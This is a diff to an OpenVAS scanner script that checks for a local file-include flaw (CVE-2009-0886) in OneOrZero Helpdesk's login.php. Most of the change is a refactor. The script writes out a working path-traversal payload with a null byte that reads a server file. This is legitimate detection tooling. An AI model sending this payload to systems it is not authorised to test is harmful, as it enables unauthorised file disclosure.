@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: OneOrZero_helpdesk_local_file_include.nasl 5002 2017-01-13 10:17:13Z teissa $
+# $Id: OneOrZero_helpdesk_local_file_include.nasl 5767 2017-03-29 13:32:35Z cfi $
 #
 # OneOrZero Helpdesk 'login.php' Local File Include Vulnerability
 #
@@ -34,22 +34,19 @@ tag_summary = "OneOrZero Helpdesk is prone to a local file-include vulnerability
   OneOrZero Helpdesk 1.6.5.7 is vulnerable; other versions may also be
   affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100026);
- script_version("$Revision: 5002 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-13 11:17:13 +0100 (Fri, 13 Jan 2017) $");
+ script_version("$Revision: 5767 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 15:32:35 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-0886");
  script_bugtraq_id(34029);
-
  script_name("OneOrZero Helpdesk 'login.php' Local File Include Vulnerability");
-
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -63,27 +60,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/oozv1657","/helpdesk", cgi_dirs());
+foreach dir( make_list_unique( "/oozv1657", "/helpdesk", cgi_dirs( port:port ) ) ) { 
 
-foreach d (dir)
-{ 
- url = string(d, "/common/login.php?default_language=/../../supporter/timer.js%00");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
- if( buf == NULL )continue;
+  if( dir == "/" ) dir = "";
+  url = string(dir, "/common/login.php?default_language=/../../supporter/timer.js%00");
 
- if (
-     egrep(pattern:"^var.timeSpent.=.[0-9]+;.*$", string: buf) 
-    )
-     
- 	{    
-       	  security_message(port:port);
-          exit(0);
-        }
+  if(http_vuln_check(port:port, url:url,pattern:"^var.timeSpent.=.[0-9]+;.*$")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 99 );
